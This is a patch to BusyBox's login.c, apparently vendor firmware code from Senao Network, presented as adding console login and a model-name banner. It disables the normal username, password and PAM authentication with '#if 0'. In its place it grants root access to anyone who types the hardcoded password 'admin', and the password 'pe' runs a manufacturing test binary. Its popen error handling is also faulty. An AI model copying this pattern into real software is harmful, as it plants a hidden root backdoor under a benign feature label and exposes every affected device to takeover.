@@ -1,0 +1,96 @@
+--- a/loginutils/login.c
++++ b/loginutils/login.c
+@@ -21,6 +21,18 @@
+ # include <selinux/flask.h> /* for security class definitions  */
+ #endif
+ 
++/********** Senao Network **********
++ * And extended to support console login
++ ***********************************/
++#define SZFMT_UCI_CMD			"/sbin/uci get sysProductInfo.model.modelName 2>/dev/null"			///< The command to get model name
++
++///< show the banner when ask password to login console
++#define BANNER                                                                \
++"************************************************************************\n"  \
++"*                         %16s                             *\n"  \
++"************************************************************************\n\n"
++/********** end of patch **********/
++
+ #if ENABLE_PAM
+ /* PAM may include <locale.h>. We may need to undefine bbox's stub define: */
+ # undef setlocale
+@@ -268,10 +280,51 @@ int login_main(int argc UNUSED_PARAM, ch
+ 
+ 	openlog(applet_name, LOG_PID | LOG_CONS, LOG_AUTH);
+ 
++/********** Senao Network **********
++ * And extended to support console login
++ ***********************************/
++	FILE  *pPipe = NULL;
++	char  szBuf[64], *pcSrc = NULL;
++	// Format the command.
++	snprintf(szBuf, sizeof(szBuf), SZFMT_UCI_CMD);
++
++	// Open a 'reading' pipe for the command.
++	if (NULL == (pPipe = popen(szBuf, "r")))
++	{
++		printf("ERROR: Can't popen the command \"%s\".\n", szBuf);
++	}
++	// Get the output string.
++	if (NULL == fgets(szBuf, sizeof(szBuf), pPipe))
++	{
++		printf("Can't get the output of the command \"%s\".\n", szBuf);
++	}
++
++	// Find the first space or '\t' character, and replace it with the end-of-string.
++	for (pcSrc = szBuf; *pcSrc; pcSrc++)
++	{
++		if ((' ' == *pcSrc) || ('\t' == *pcSrc) || ('\n' == *pcSrc ))
++		{
++			*pcSrc = 0;
++			break;
++		}
++	}
++
++	// Close the pipe.
++	if (pPipe)  pclose(pPipe);
++
++	printf(BANNER,szBuf);
++
++/********** end of patch **********/
+ 	while (1) {
+ 		/* flush away any type-ahead (as getty does) */
+ 		tcflush(0, TCIFLUSH);
+ 
++/********** Senao Network **********
++ * And extended to support console login
++ ***********************************/
++
++#if 0 /* And extended to support console login */
++/********** end of patch **********/
+ 		if (!username[0])
+ 			get_username_or_die(username, sizeof(username));
+ 
+@@ -371,6 +424,22 @@ int login_main(int argc UNUSED_PARAM, ch
+ 			break;
+ #endif /* ENABLE_PAM */
+  auth_failed:
++
++/********** Senao Network **********
++ * And extended to support console login
++ ***********************************/
++#endif /* And extended to support console login */
++
++		char *pszPassword;
++		pszPassword = getpass("password: ");
++		pw = getpwnam("root");
++		if(strcmp(pszPassword,"admin")==0)
++			break;
++		else if (strcmp(pszPassword,"pe")==0) {
++			alarm(0);
++			system("/sbin/manufac_test");
++		}
++/********** end of patch **********/
+ 		opt &= ~LOGIN_OPT_f;
+ 		bb_do_delay(LOGIN_FAIL_DELAY);
+ 		/* TODO: doesn't sound like correct English phrase to me */
